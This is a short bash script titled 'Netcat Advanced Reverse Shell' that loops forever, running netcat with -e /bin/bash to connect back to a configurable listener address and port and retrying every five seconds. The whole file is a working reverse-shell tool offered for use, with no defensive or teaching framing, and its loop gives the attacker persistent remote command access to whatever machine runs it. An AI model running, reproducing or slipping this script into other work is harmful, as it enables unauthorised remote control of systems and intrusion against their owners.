#!/bin/bash
# Netcat Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4452

while true; do
    nc -e /bin/bash $LHOST $LPORT
    sleep 5
done
